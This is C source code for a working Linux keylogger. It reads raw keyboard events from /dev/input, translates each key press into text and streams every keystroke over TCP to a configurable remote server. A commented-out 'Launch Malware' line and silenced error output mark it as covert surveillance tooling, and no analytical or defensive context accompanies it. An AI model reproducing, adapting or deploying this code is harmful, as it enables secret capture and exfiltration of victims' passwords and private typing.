#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/tcp.h>

#define DEVICE "/dev/input/event1"  // Replace X with the correct event number for your keyboard
#define SERVER_IP "127.0.0.1"       // Replace with the actual server's IP or "127.0.0.1" for localhost
#define PORT 12345
#define BUFFER_SIZE 1024

// Function to initialize the connection to the server
int init_connection() {
    int sock;
    struct sockaddr_in server_addr;

    // Create a TCP socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        // perror("Socket creation error");
        exit(1);
    }

    // Define the server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    // Convert the IP address from text to binary form
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        // perror("Invalid address");
        exit(1);
    }

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        // perror("Connection failed");
        close(sock);
        exit(1);
    }

    return sock;
}

// Function to send captured keystrokes to the server
void send_key_to_server(int sock, char *key) {
    char buffer[BUFFER_SIZE];
    snprintf(buffer, sizeof(buffer), "%s", key);  // Add key to buffer

    // Send the key to the server with a null terminator for correct string handling
    int sent_bytes=send(sock, buffer, strlen(buffer), 0);
    if ( sent_bytes < 0) {
        // perror("Send failed");
    }
    // printf("send %d bytes successful\n",sent_bytes);
}

int main() {
    int fd, sock;
    struct input_event ev;
const char *keys[256] = {
    [KEY_RESERVED] = "", [KEY_ESC] = "Esc", [KEY_1] = "1", [KEY_2] = "2",
    [KEY_3] = "3", [KEY_4] = "4", [KEY_5] = "5", [KEY_6] = "6",
    [KEY_7] = "7", [KEY_8] = "8", [KEY_9] = "9", [KEY_0] = "0",
    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", [KEY_BACKSPACE] = "Backspace",
    [KEY_TAB] = "Tab", [KEY_Q] = "q", [KEY_W] = "w", [KEY_E] = "e",
    [KEY_R] = "r", [KEY_T] = "t", [KEY_Y] = "y", [KEY_U] = "u",
    [KEY_I] = "i", [KEY_O] = "o", [KEY_P] = "p", [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]", [KEY_ENTER] = "\n", [KEY_LEFTCTRL] = "Ctrl",
    [KEY_A] = "a", [KEY_S] = "s", [KEY_D] = "d", [KEY_F] = "f",
    [KEY_G] = "g", [KEY_H] = "h", [KEY_J] = "j", [KEY_K] = "k",
    [KEY_L] = "l", [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'",
    [KEY_GRAVE] = "`", [KEY_LEFTSHIFT] = "Shift", [KEY_BACKSLASH] = "\\",
    [KEY_Z] = "z", [KEY_X] = "x", [KEY_C] = "c", [KEY_V] = "v",
    [KEY_B] = "b", [KEY_N] = "n", [KEY_M] = "m", [KEY_COMMA] = ",",
    [KEY_DOT] = ".", [KEY_SLASH] = "/", [KEY_RIGHTSHIFT] = "Shift",
    [KEY_KPASTERISK] = "*", [KEY_LEFTALT] = "Alt", [KEY_SPACE] = " ",
    [KEY_CAPSLOCK] = "CapsLock", [KEY_F1] = "F1", [KEY_F2] = "F2",
    [KEY_F3] = "F3", [KEY_F4] = "F4", [KEY_F5] = "F5", [KEY_F6] = "F6",
    [KEY_F7] = "F7", [KEY_F8] = "F8", [KEY_F9] = "F9", [KEY_F10] = "F10",
    [KEY_NUMLOCK] = "NumLock", [KEY_SCROLLLOCK] = "ScrollLock",
    [KEY_KP7] = "7", [KEY_KP8] = "8", [KEY_KP9] = "9", [KEY_KPMINUS] = "-",
    [KEY_KP4] = "4", [KEY_KP5] = "5", [KEY_KP6] = "6", [KEY_KPPLUS] = "+",
    [KEY_KP1] = "1", [KEY_KP2] = "2", [KEY_KP3] = "3", [KEY_KP0] = "0",
    [KEY_KPDOT] = ".", [KEY_F11] = "F11", [KEY_F12] = "F12",
    [KEY_KPENTER] = "Enter", [KEY_RIGHTCTRL] = "Ctrl", [KEY_KPSLASH] = "/",
    [KEY_RIGHTALT] = "Alt", [KEY_HOME] = "Home", [KEY_UP] = "Up",
    [KEY_PAGEUP] = "PgUp", [KEY_LEFT] = "Left", [KEY_RIGHT] = "Right",
    [KEY_END] = "End", [KEY_DOWN] = "Down", [KEY_PAGEDOWN] = "PgDn",
    [KEY_INSERT] = "Ins", [KEY_DELETE] = "Del", [KEY_PAUSE] = "Pause",
    [KEY_PRINT] = "Print", [KEY_SYSRQ] = "SysRq", [KEY_LEFTMETA] = "Meta",
    [KEY_RIGHTMETA] = "Meta", [KEY_COMPOSE] = "Compose"
};

    // printf("Launch Malware\n");
    // Open the input device (keyboard)
    if ((fd = open(DEVICE, O_RDONLY)) < 0) {
        perror("Error opening device");
        return 1;
    }

    // Initialize the connection to the server
    sock = init_connection();
    // int flag = 1;
    // setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&flag, sizeof(int));
    // Continuously read and send key events
    while (1) {
        // Read the input event
        if (read(fd, &ev, sizeof(struct input_event)) < 0) {
            // perror("Error reading event");
            return 1;
        }

        // Check if it's a key press event
        if (ev.type == EV_KEY && ev.value == 1) {  // Key press event
            if (keys[ev.code] != NULL) {
                // printf("Key pressed: %s\n", keys[ev.code]);  // Print key to console for testing
                fsync(sock); 
                // Send the key to the remote server
                send_key_to_server(sock, (char *)keys[ev.code]);
            }
        }
    }

    // Close the socket and input device file
    close(sock);
    close(fd);
    return 0;
}
